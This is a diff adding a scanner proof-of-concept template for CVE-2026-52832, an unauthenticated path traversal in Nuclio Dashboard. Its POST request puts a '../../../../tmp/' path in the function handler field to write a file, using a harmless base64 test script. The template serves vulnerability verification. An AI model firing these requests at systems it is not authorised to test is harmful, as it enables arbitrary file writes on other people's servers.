@@ -1,0 +1,85 @@
+[info]
+author = "ave"
+description = "验证 Nuclio Dashboard 未认证路径遍历漏洞，通过 spec.handler 字段的路径遍历实现任意文件写入"
+id = "POC-AVE-2026-0390"
+name = "CVE-2026-52832 PoC"
+severity = "high"
+tags = ["ave-2026-0390"]
+vuln_id = [
+    "CVE-2026-52832",
+    "AVE-2026-0390",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/functions"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+{
+  "metadata": {
+    "name": "poc-test-{{RandInt}}",
+    "namespace": "nuclio",
+    "labels": {
+      "nuclio.io/project-name": "default"
+    }
+  },
+  "spec": {
+    "handler": "../../../../tmp/poc_{{RandInt}}.txt:handler",
+    "runtime": "python:3.9",
+    "build": {
+      "functionSourceCode": "IyBUaGlzIGlzIGEgUE9DIHRlc3QgZmlsZSB3cml0dGVuIGJ5IENWRS0yMDI2LTUyODMyIEV4cGxvaXQKcHJpbnQoIlBvQyBzdWNjZXNzZnVsbHkgZXhlY3V0ZWQiKQ=="
+    },
+    "triggers": {
+      "http": {
+        "kind": "http",
+        "attributes": {
+          "maxWorkers": 1
+        }
+      }
+    }
+  }
+}
+"""
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    201,
+    202,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "function",
+    "created",
+    "deployed",
+    "success",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/functions/poc-test-{{RandInt}}"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
